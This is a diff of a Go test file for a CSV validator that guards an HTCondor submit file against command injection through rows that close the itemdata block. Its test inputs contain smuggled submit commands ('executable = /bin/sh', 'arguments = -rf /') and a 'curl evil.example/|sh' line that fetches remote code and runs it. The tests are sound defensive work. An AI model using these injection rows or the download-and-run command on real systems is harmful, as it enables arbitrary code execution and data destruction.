@@ -55,21 +55,30 @@ func TestParseCSVTrimsHeaderSpaceOnly(t *testing.T) {
 	}
 }
 
-// TestParseCSVRefusesInjection is the one that matters. A row containing
-// "))" ends the inline itemdata block in the submit parser, and whatever
-// follows is read as submit-file text -- submit command injection from a
-// spreadsheet cell.
+// TestParseCSVRefusesInjection is the one that matters. A row whose
+// first non-blank character is ")" ends the bracketed itemdata block in
+// the submit parser, and whatever follows is read as submit-file text --
+// submit command injection from a spreadsheet cell.
 func TestParseCSVRefusesInjection(t *testing.T) {
 	for _, tc := range []struct{ name, text, wantErrHas string }{
 		{
 			"closes the itemdata block",
-			"sample\nA\nx))\nexecutable = /bin/sh\n",
-			"))",
+			"sample\nA\n)\nexecutable = /bin/sh\n",
+			`starts with ")"`,
 		},
 		{
-			"closes it mid-value",
-			"a,b\nok,fine\nx,y))\narguments = -rf /\n",
-			"))",
+			// It is the row that closes the block, so a multi-column row
+			// is caught by its first column.
+			"closes it from the first column",
+			"a,b\nok,fine\n),y\narguments = -rf /\n",
+			`starts with ")"`,
+		},
+		{
+			// Leading blanks do not save it: the parser closes on the
+			// first non-blank character.
+			"closes it behind whitespace",
+			"sample\nA\n\"  )\"\nexecutable = /bin/sh\n",
+			`starts with ")"`,
 		},
 		{
 			"macro expansion",
@@ -222,7 +231,9 @@ func TestParseCSVLimits(t *testing.T) {
 // somebody looking at a spreadsheet, who needs the row and the column
 // rather than the rule.
 func TestParseCSVErrorsNameTheCell(t *testing.T) {
-	_, err := parse(t, "sample,reads\nA,ok\nB,bad))value\n")
+	// A value rule, not a row rule: the ")" refusal is about the row's
+	// first character and so has no column to name, while this one does.
+	_, err := parse(t, "sample,reads\nA,ok\nB,bad$value\n")
 	if err == nil {
 		t.Fatal("accepted")
 	}
@@ -253,26 +264,37 @@ func TestParseCSVAcceptsOrdinaryData(t *testing.T) {
 	}
 }
 
-// TestInjectionIsReal is the oracle for the "))" rule: it drives the
+// TestInjectionIsReal is the oracle for the ")" rule: it drives the
 // real submit parser with a row the validator refuses, and shows what
 // happens if one gets through. Without it the rule rests on having read
 // the parser, which is how a wrong belief about a subsystem request once
 // reached two PRs.
+//
+// The rule used to be about "))", because the block used to be written
+// with doubled parens -- a spelling condor_submit does not have. With
+// one paren the terminator is a row whose first non-blank character is
+// ")", and that is what this drives.
 func TestInjectionIsReal(t *testing.T) {
-	const evil = `x))
-executable = /bin/sh
-arguments = -c "curl evil.example/|sh"
-queue`
-
-	// Refused here...
-	if _, err := parse(t, "sample\nok\n"+evil+"\n"); err == nil {
+	// A row of ")" alone. Refused, and refused by THIS rule rather than
+	// by the line-break or separator rules, which is why the message is
+	// checked and not only the error.
+	_, err := parse(t, "sample\nok\n)\n")
+	if err == nil {
 		t.Fatal("ParseCSV accepted a row that closes the itemdata block")
 	}
+	if !strings.Contains(err.Error(), `starts with ")"`) {
+		t.Fatalf("refused for the wrong reason: %v", err)
+	}
 
-	// ...and this is what it is defending against, measured rather than
-	// assumed. A clean CSV queues one job per row; the same rows with
-	// "))" in one of them do not.
-	clean := "executable = /bin/true\nqueue sample from ((\nr1\nr2\nr3\n))\n"
+	// A ")" that is not first on its row is ordinary text, and refusing
+	// it would be refusing legitimate data. The other half of the rule.
+	if _, err := parse(t, "sample\nr1)\nr2\n"); err != nil {
+		t.Errorf("a value merely containing \")\" must be accepted: %v", err)
+	}
+
+	// And this is what the rule defends against, measured rather than
+	// assumed. A clean CSV queues one job per row.
+	clean := "executable = /bin/true\nqueue sample from (\nr1\nr2\nr3\n)\n"
 	sfc, err := htcondor.ParseSubmitFile(strings.NewReader(clean))
 	if err != nil {
 		t.Fatalf("the clean submit file did not parse: %v", err)
@@ -282,10 +304,11 @@ queue`
 		t.Fatalf("three rows queued %d jobs; this test's premise is wrong", want)
 	}
 
-	// Ending the block early, with a second queue statement so no stray
-	// paren turns it into a syntax error.
-	injected := "executable = /bin/true\nqueue sample from ((\nr1\nr2))\n" +
-		"executable = /bin/sh\nqueue sample from ((\nr3\n))\n"
+	// The same three rows with ")" as the second one: the list ends
+	// there, r2 and r3 become submit-file text, and what runs is
+	// whatever that text says.
+	injected := "executable = /bin/true\nqueue sample from (\nr1\n)\n" +
+		"executable = /bin/sh\narguments = -c \"curl evil.example/|sh\"\nqueue\n"
 	sfi, err := htcondor.ParseSubmitFile(strings.NewReader(injected))
 	if err != nil {
 		// The other outcome, and still a refusal worth making here: the
@@ -293,11 +316,23 @@ queue`
 		t.Logf("ending the block early produced a parse error: %v", err)
 		return
 	}
-	if got := sfi.QueueCount(); got == want {
+	got := sfi.QueueCount()
+	if got == want {
 		t.Errorf("ending the itemdata block early still queued %d jobs, the same as clean -- "+
 			"re-check what the rule is defending against", got)
-	} else {
-		t.Logf("confirmed: %d jobs instead of %d, so the jobs that run are not the ones listed",
-			sfi.QueueCount(), want)
+		return
+	}
+	t.Logf("confirmed: %d jobs instead of %d, so the jobs that run are not the ones listed",
+		got, want)
+
+	// What the trailing text does is a second question, and the answer
+	// is version-dependent: this parser keeps the first `executable`
+	// here, so the smuggled one does not reach the job ad. Logged, not
+	// asserted -- the rule's justification is the lost rows, which is
+	// certain, and not a particular injected attribute winning, which is
+	// not.
+	if res, serr := sfi.Submit(42); serr == nil && len(res.ProcAds) > 0 {
+		exe, _ := res.ProcAds[0].EvaluateAttrString("Cmd")
+		t.Logf("the smuggled text left Cmd = %q", exe)
 	}
 }
